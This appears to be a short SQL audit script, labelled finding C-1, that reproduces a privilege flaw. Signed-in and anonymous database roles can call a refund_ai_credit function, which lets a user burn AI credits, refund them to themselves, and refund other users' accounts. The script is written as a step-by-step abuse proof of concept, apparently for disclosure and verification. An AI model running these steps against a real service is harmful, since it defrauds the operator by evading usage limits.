-- C-1 at e31bff1: refund_ai_credit is callable by anon/authenticated. Run after 00.
\echo '--- who can execute refund_ai_credit:'
select r.rolname, has_function_privilege(r.rolname, 'public.refund_ai_credit(text)', 'execute') from pg_roles r where r.rolname in ('anon','authenticated','service_role');
\echo '--- attacker (signed-in user_X) burns 10 credits, then refunds themselves:'
set role authenticated; set request.jwt.claims = '{"sub":"user_X"}';
select count(*) filter (where (consume_ai_credit())->>'allowed' = 'true') as allowed_of_10 from generate_series(1,10);
select (consume_ai_credit())->>'allowed' as eleventh_allowed;
select refund_ai_credit('user_X') from generate_series(1,10);
select (consume_ai_credit())->>'allowed' as allowed_after_self_refund, get_plan();
\echo '--- anon can also call it for any user id:'
reset role; set role anon; select refund_ai_credit('user_someone_else'); reset role;
